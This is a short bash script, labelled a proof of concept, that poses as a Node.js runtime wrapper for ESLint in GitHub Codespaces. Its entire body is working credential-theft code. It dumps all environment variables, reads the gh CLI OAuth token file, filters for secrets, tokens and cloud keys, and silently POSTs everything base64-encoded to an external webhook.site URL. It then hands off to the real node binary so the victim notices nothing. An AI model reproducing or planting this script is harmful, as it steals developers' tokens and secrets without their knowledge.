#!/bin/bash
# ESLint runtime proxy — PoC for GitHub Codespaces eslint.runtime injection
# Stage 1: exfiltrate credentials and all Codespace secrets
# Stage 2: proxy transparently to real Node.js so ESLint keeps working

WEBHOOK="https://webhook.site/aa3a43f4-a664-449a-a441-ddd5defe240c"

exfil() {
    local GITHUB_TK="${GITHUB_TOKEN:-NOT_SET}"
    local REPO="${GITHUB_REPOSITORY:-unknown}"
    local ACTOR="${GITHUB_ACTOR:-unknown}"

    # Full environment dump — captures GITHUB_TOKEN, CODESPACES_USER_SECRET_*, etc.
    local ENV_DUMP
    ENV_DUMP=$(env 2>/dev/null | base64 -w0 2>/dev/null || env 2>/dev/null | base64 2>/dev/null)

    # gh CLI config file — contains personal OAuth token if gh auth login was run inside the Codespace
    local GH_CLI_CONFIG
    GH_CLI_CONFIG=$(cat "${HOME}/.config/gh/hosts.yml" 2>/dev/null | base64 -w0 2>/dev/null || echo "")

    # High-value subset — permanent secrets filtered for fast triage
    local SECRETS_DUMP
    SECRETS_DUMP=$(env 2>/dev/null \
        | grep -iE "SECRET|TOKEN|KEY|PASSWORD|CREDENTIAL|AWS|AZURE|GCP|CLOUD|NPM|DB_|DATABASE" \
        | base64 -w0 2>/dev/null || echo "")

    curl -sk \
        --max-time 8 \
        -X POST "${WEBHOOK}" \
        -H "Content-Type: application/json" \
        -d "{
            \"finding\": \"eslint.runtime injection — GitHub Codespaces\",
            \"repo\": \"${REPO}\",
            \"actor\": \"${ACTOR}\",
            \"github_token\": \"${GITHUB_TK}\",
            \"env_b64\": \"${ENV_DUMP}\",
            \"gh_cli_config_b64\": \"${GH_CLI_CONFIG}\",
            \"secrets_b64\": \"${SECRETS_DUMP}\"
        }" &>/dev/null &

    disown
}

exfil

# Hand off to the real Node.js binary — ESLint server starts normally, no visible anomaly
REAL_NODE=$(command -v node 2>/dev/null || echo "/usr/local/bin/node")
exec "${REAL_NODE}" "$@" 2>/dev/null
